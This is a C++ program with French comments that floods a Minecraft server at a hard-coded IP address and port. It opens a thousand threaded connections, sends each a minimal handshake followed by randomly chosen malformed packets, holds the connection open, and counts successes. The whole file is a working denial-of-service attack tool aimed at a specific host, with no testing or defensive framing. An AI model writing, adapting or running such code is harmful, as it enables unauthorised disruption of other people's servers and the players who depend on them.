#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <cstring>
#include <random>
#include <atomic>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

// Configuration
const char* TARGET_IP = "91.197.6.51";
const uint16_t TARGET_PORT = 25635;
const int NUM_CONNECTIONS = 1000;
const int DELAY_BETWEEN_MS = 1; // délai entre création threads

// Paquets malformés
const std::vector<std::vector<uint8_t>> malformed_packets = {
    {0x00, 0x04, 0x00, 0x2f, 0x00},
    {0x00, 0x02, 0xff, 0xff},
    {0x00, 0x03, 0x01},
    {0x00, 0x01},
    {0x00, 0x00},
};

// Fonction pour construire un handshake minimal similaire au Python
std::vector<uint8_t> build_handshake_packet(const char* ip, uint16_t port) {
    std::vector<uint8_t> packet;

    uint8_t packet_id = 0x00; // handshake packet id
    uint8_t protocol_version = 47; // exemple pour Minecraft 1.8.9

    // Adresse IP en string et sa longueur
    size_t ip_len = strlen(ip);

    // On construit la charge utile (payload)
    // Format: PacketID (1 byte) + Protocol Version (1 byte) + Length IP (1 byte) + IP + Port (2 bytes) + Next State (1 byte)
    packet.push_back(packet_id);
    packet.push_back(protocol_version);
    packet.push_back(static_cast<uint8_t>(ip_len));
    packet.insert(packet.end(), ip, ip + ip_len);
    packet.push_back(static_cast<uint8_t>(port >> 8));
    packet.push_back(static_cast<uint8_t>(port & 0xFF));
    packet.push_back(1); // Next state = 1 (status)

    // Préfixe longueur paquet (varint simplifié sur 1 byte)
    uint8_t length = static_cast<uint8_t>(packet.size());
    packet.insert(packet.begin(), length);

    return packet;
}

void flood_connection(int index, std::atomic<int>& success_count) {
    // Générateur aléatoire pour paquets malformés
    static thread_local std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<size_t> dist(0, malformed_packets.size() - 1);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        std::cerr << "[" << index << "] Erreur socket\n";
        return;
    }

    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);

    if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
        std::cerr << "[" << index << "] Erreur inet_pton\n";
        close(sock);
        return;
    }

    // Connexion
    if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        std::cerr << "[" << index << "] Connexion refusée ou timeout\n";
        close(sock);
        return;
    }

    // Envoi handshake
    auto handshake_packet = build_handshake_packet(TARGET_IP, TARGET_PORT);
    ssize_t sent = send(sock, handshake_packet.data(), handshake_packet.size(), 0);
    if (sent != (ssize_t)handshake_packet.size()) {
        std::cerr << "[" << index << "] Erreur envoi handshake\n";
        close(sock);
        return;
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(50));

    // Envoi 2 paquets malformés espacés
    for (int i = 0; i < 2; ++i) {
        auto& pkt = malformed_packets[dist(rng)];
        sent = send(sock, pkt.data(), pkt.size(), 0);
        if (sent != (ssize_t)pkt.size()) {
            std::cerr << "[" << index << "] Connexion fermée par le serveur lors de l'envoi du paquet malformé #" << (i+1) << "\n";
            close(sock);
            return;
        }
        std::cout << "[" << index << "] Paquet malformé #" << (i+1) << " envoyé\n";
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    // Maintien connexion ouverte 3 secondes
    std::this_thread::sleep_for(std::chrono::seconds(3));

    close(sock);
    std::cout << "[" << index << "] Connexion ouverte, paquets envoyés, fermée\n";
    success_count++;
}

int main() {
    std::cout << "Début du flood avec " << NUM_CONNECTIONS << " connexions sur " << TARGET_IP << ":" << TARGET_PORT << "\n";

    std::vector<std::thread> threads;
    std::atomic<int> success_count(0);

    for (int i = 0; i < NUM_CONNECTIONS; ++i) {
        threads.emplace_back(flood_connection, i + 1, std::ref(success_count));
        std::this_thread::sleep_for(std::chrono::milliseconds(DELAY_BETWEEN_MS));
    }

    for (auto& t : threads) {
        if (t.joinable())
            t.join();
    }

    std::cout << "Flood terminé. Connexions réussies : " << success_count << "\n";
    return 0;
}
